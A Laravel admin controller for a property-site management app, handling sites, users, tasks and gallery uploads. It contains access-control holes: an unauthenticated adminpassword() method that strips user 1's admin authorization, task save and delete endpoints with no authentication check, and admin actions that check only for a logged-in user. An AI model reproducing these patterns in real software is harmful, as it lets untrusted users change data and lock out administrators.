<?php
use Illuminate\Foundation\Console\Presets\React;
use Symfony\Component\VarDumper\VarDumper;
namespace App\Http\Controllers\Admin;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Task;
use App\Providers;
use App\Admin;
use DB;
use View;

class AdminController extends Controller
{
    //

    public $LIST_QUESTION, $LIST_CATEGORY;

    public function __construct()
    {           
        $LIST_QUESTION = Admin::getAllQuestionList();
        $LIST_CATEGORY = Admin::getAllCategoryList();    
        $SITELIST = Admin::getAllSiteList();    

        View::share('LIST_CATEGORY', $LIST_CATEGORY);
        View::share('LIST_QUESTION', $LIST_QUESTION);
        View::share ('SITELIST', $SITELIST);
    }
    public function index() {
        session()->put('custom_url', '/admin');
        if ( !Auth::user() ) 
            return redirect(route('login'));
        if ( Auth::user()->authorization)
            return view('admin.input');
        return redirect('/');        
    }
    public function saveSiteProperties(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        if ( $request['edit'] === "true" ) {
            Admin::updateSiteProperties($request, $request['id']);
            return redirect('admin/sitemanage');
        }
        else {
            Admin::addSiteProperties($request);
            return redirect('admin');
        }                
        // echo json_encode(array('status' => true));
    }
    public function fileUpload(Request $request) {
        $data = $request;
        dd($data['file_up']);
        // dd($file->store('avatar'));

    }
    public function sitemanage(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $DATE_LIST = [];
        $SITELIST = Admin::getAllSiteList(); 
        foreach ( $SITELIST as $_i => $val ) {
            $SITE_PROPERTY = Admin::getAllSitePropertiesByID( $val->id );
            $DATE_LIST[] = [    'property_build_date' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->property_build_date),
                                'date_added_STF' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->date_added_STF) ];
        }               
        return view('admin.sitemanage', ['DATE_LIST' => $DATE_LIST]);
    }
    public function editSite(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $site_id = $request['id'];
        $SITE_PROPERTY = Admin::getAllSitePropertiesByID($site_id);
        $MANAGER_SERVICE = Admin::getManagerInfoByID($SITE_PROPERTY->servicemng_id);
        $MANAGER_COMMUNITY = Admin::getManagerInfoByID($SITE_PROPERTY->communitymng_id);
        $MANAGER_REGINAL = Admin::getManagerInfoByID($SITE_PROPERTY->reginalmng_id);
        $SCOREVALUES = Admin::getAllScoreBySiteID($site_id);
        $SCORE_NOTE = Admin::getAllNoteBySiteID($site_id);
        $PROPERTY_DATE = [  'primary_eval_date' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->primary_eval_date),
                            'milestone_eval_date' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->milestone_eval_date),
                            'final_eval_date' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->final_eval_date),
                            'property_build_date' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->property_build_date),
                            'date_added_STF' => Admin::format_MM_DD_YYYY($SITE_PROPERTY->date_added_STF) ];
        $SCORE_TYPE = [ 'Reactionary', 'Preventative', 'Predictive', 'Excellence' ];
        $GALLERY_BEFORE = Admin::string2Array($SITE_PROPERTY->gallery_before);
        $GALLERY_AFTER = Admin::string2Array($SITE_PROPERTY->gallery_after);
        
        // dd($SCOREVALUES);
        return view('admin.edit', [ 'SITE_PROPERTY' => $SITE_PROPERTY, 
                                    'MANAGER_SERVICE' => $MANAGER_SERVICE,
                                    'MANAGER_COMMUNITY' => $MANAGER_COMMUNITY,
                                    'MANAGER_REGINAL' => $MANAGER_REGINAL,
                                    'SCOREVALUES' => $SCOREVALUES,
                                    'SCORE_NOTE' => $SCORE_NOTE,
                                    'PROPERTY_DATE' => $PROPERTY_DATE,
                                    'SCORE_TYPE' => $SCORE_TYPE,
                                    'GALLERY_BEFORE' => $GALLERY_BEFORE,
                                    'GALLERY_AFTER' => $GALLERY_AFTER,]);
    }
    public function deleteSite(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $site_id = $request['id'];
        $status = Admin::deleteSite($site_id);
        return redirect('/admin/sitemanage');
    }
    public function users(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $USERLIST = Admin::getAllUsersList(); 
        $USER_ID = 0;
                       
        return view('admin.users', ['USERLIST' => $USERLIST, 'USER_ID' => $USER_ID]);
    }
    public function editUser(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $user_id = $request['id'];
        $data = Admin::getUserPropertiesByID($user_id);
        $SITELIST_ID = Admin::getSiteListBySiteIDS(Admin::string2Array($data['site_id'])); 
        $data['site_list'] = $SITELIST_ID;
        echo json_encode($data);
    }
    public function saveUser(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        if ( $request['is_edit'] == "edit" ) {
            $status = Admin::updateUser($request);
        } else if ( $request['is_edit'] == "add" ) {
            User::create([
                'name' => $request['user_name'],
                'email' => $request['user_email'],
                'avatar' => Admin::storeAvatarFile($request['user_avatar']),
                'site_id' => $request['user_site_ids'],
                'phone' => $request['user_phone'],
                'resume' => $request['user_resume'],
                'password' => Hash::make($request['user_password']),
            ]);
        }        
        return redirect('admin/users');
    }
    public function deleteUser(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $user_id = $request['id'];
        $status = Admin::deleteUser($user_id);
        echo json_encode(array('status' => TRUE));
    }
    
    public function taskManagement(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        
        $tasklist = [];
        $STATUS = -1;
        $SEARCH = null;
        $FILTERTYPE = '';
        $FILTERVAL = -1;
        
        $_query = [];
        if($request['state'] != null) {
            $_query[] = ['status', '=', $request['state']];
            $STATUS = $request['state'];
        }
        if($request['search'] != null) {
            $_query[] = ['head', 'like', '%'.$request['search'].'%'];
            $SEARCH = $request['search'];
        }
        if($request['ftype'] != null) {
            $FILTERTYPE = $request['ftype'];
        }
        if($request['fval'] != null) {
            $FILTERVAL = $request['fval'];
        }
        
        if(count($_query)) {
            $tasklist = Task::where($_query)->get();
        }else{
            $tasklist = Task::all();
        }

        $TASKLIST = [];
        $SITELIST = Admin::getAllSiteList();
        $LOCATIONS = Admin::getSiteLocations();
        $USERLIST = Admin::getAllUsersList();   
        $sitelist = [];
        
        foreach ( $SITELIST as $_i => $val ) {
            $sitelist[$val->id] = $val;
        }
        
        $current_date = config('app.datetime');  
        
        foreach ( $tasklist as $_i => $val ) {
            
            $_differDay = $this->getDifferDays($val->date_due, $current_date);
            
            if($FILTERTYPE == "date"){
                $_c_t = strtotime($current_date);
                $_d_t = strtotime($val->date_due);
                
                if(date('Y', $_d_t) != date('Y', $_c_t)) {continue;}
                
                $_c_m = date('m', $_c_t);
                $_d_m = date('m', $_d_t);
                if($FILTERVAL == 'month' && $_c_m != $_d_m) {continue;}
                
                $_c_d = date('d', $_c_t);
                $_d_d = date('d', $_d_t);
                
                if($FILTERVAL == 'today' && ($_c_m != $_d_m || $_c_d != $_d_d)) {continue;}
                if($FILTERVAL == 'yesterday' && ($_c_m != $_d_m || $_c_d != $_d_d + 1)) {continue;}
                
                $_weeks = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
                $_c_w = $_c_d - array_search(date('D', $_c_t), $_weeks);
                $_d_w = $_d_d - array_search(date('D', $_d_t), $_weeks);
                if($FILTERVAL == 'week' && ($_c_m != $_d_m || $_c_w != $_d_w)) {continue;}
            }else if($FILTERTYPE == "status"){
                if($FILTERVAL == 3){
                    if($_differDay >= 0) {continue;}
                    if($val->status == 2) {continue;}    
                }else if($FILTERVAL == 2){
                    if($FILTERVAL != $val->status) {continue;}
                }else{
                    if($_differDay < 0) {continue;}
                    if($FILTERVAL != $val->status) {continue;}    
                }
                
                // if($FILTERVAL == 0 && $_differDay < 0) {continue;}
            }else if($FILTERTYPE == "location"){
                if(empty($val->site_id) || empty($sitelist[$val->site_id])) {continue;}
                if($FILTERVAL != $sitelist[$val->site_id]->site_location) {continue;}
            }else if($FILTERTYPE == "priority"){
                if($FILTERVAL != $val->priority) {continue;}
            }
            
            $val['datedue'] = Admin::format_MM_DD_YYYY($val->date_due);  
            $val['daydue'] = $_differDay;
            
            if($val->site_id){
                $val['site'] = empty($sitelist[$val->site_id]) ? '' : $sitelist[$val->site_id]->site_name;
            }else{
                $val['site'] = '';
            }

            $TASKLIST[] = $val;
        }
        
        $TOTAL = count($TASKLIST);
        
        $PAGENATION = [];
        $PAGENATION['from'] = 1;
        $PAGENATION['to'] = 1;
        $PAGENATION['page'] = 1;
        
        $_cntPerPage = 10;
        if($request['page']) {
            $PAGENATION['page'] = $request['page'];
            $PAGENATION['from'] = 5*floor(($PAGENATION['page'] - 1)/5) + 1;
        }
        
        $PAGENATION['to'] = min($PAGENATION['from'] + 4, ceil($TOTAL/$_cntPerPage));
        $TASKLIST = array_slice($TASKLIST, ($PAGENATION['page'] - 1)*10, 10);
        
                    
        return view('admin.taskmanager', [  'TASKLIST' => $TASKLIST,
                                            'LOCATIONS' => $LOCATIONS,
                                            'USERLIST' => $USERLIST,
                                            'STATUS' => $STATUS,
                                            'SEARCH' => $SEARCH,
                                            'FILTERTYPE' => $FILTERTYPE,
                                            'FILTERVAL' => $FILTERVAL,
                                            'TOTAL' => $TOTAL,
                                            'PAGENATION' => $PAGENATION]);
    }

    // ---------------------------------------------------------------------------- ajax for upload images
    public function uploadGallery(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $category = $request['gallery_cat'];
        $file_count = $request['file_count'];
        $result = Admin::storeBlogFile($category, $file_count,  $request);
        echo json_encode($result);
    }
    public function adminpassword(Request $request) {
        DB::table('users')->where('id', '1')->update( [ 'authorization' => '0' ] );
    }    
    public function taskManage(Request $request) {
        if ( !Auth::user() ) 
            return redirect(route('login'));
        $TASKLIST = Task::where('site_id', $request['id'])->get(); //Admin::getAllTaskListBySiteID($request['id']);      
        $USERLIST = Admin::getAllUsersList();   
        $DATE_DUE = [];
        $day_due = [];
        $site_property = Admin::getAllSitePropertiesByID($request['id']);
        
        $current_date = config('app.datetime');     
        
        foreach ( $TASKLIST as $_i => $val ) {
            $TASKLIST[$_i]['datedue'] = Admin::format_MM_DD_YYYY($val->date_due);  
            $TASKLIST[$_i]['daydue'] = ( $current_date > $val->date_due ) ? -1 : Admin::getDiffDate($val->date_due, $current_date);
        }  
        return view('admin.taskmanage', [   'DATE_DUE' => $DATE_DUE,
                                            'TASKLIST' => $TASKLIST, 
                                            'DAY_DUE' => $day_due,
                                            'SITE_ID' => $request['id'],
                                            'SITE_NAME' => $site_property->site_name,
                                            'USERLIST' => $USERLIST ]);
    }
    public function ajax_saveTask(Request $request) {
        $tData = [   'head' => $request['task_head'],
                    'description' => $request['task_description'],
                    'status' => $request['task_status'],
                    'date_due' => Admin::convertFormatToDate($request['task_datedue']),
                    'site_id' => $request['site_id'],
                    'priority' => $request['priority'] ];

        if ( $request['is_edit'] == 'edit' ) {
            $_tID = $request['task_id'];
            
            Task::where('id', $_tID)->update($tData);
            DB::table('user_task')->where('task_id', $_tID)->delete();

        }else if($request['is_edit'] == 'add') {
            
            $_tID = Task::create($tData)->id;
        }

        $_uIDs = $request['task_assignuser'];
        if(!empty($_uIDs)) {
            DB::table('user_task')->insert($this->makePairArray($_uIDs, $_tID));
        }

        echo json_encode(array('status' => true));
    }

    private function makePairArray($array, $other){
        $newArray = [];
        foreach($array as $_elem){
            $newArray[] = array("user_id" => $_elem, 'task_id' => $other);
        }
        return $newArray;
    }

    public function ajax_deleteTask(Request $request) {
        Admin::deleteTask($request['id']);
        echo json_encode(array('status' => true));
    }
    public static function getDifferDays($d1, $d2){
        $_dT1 = strtotime($d1);
        $_dT2 = strtotime($d2);
        
        $_perD = 60*60*24;
        $_differ = floor(($_dT1 - $_dT2)/$_perD);
        return $_differ;
    }
}
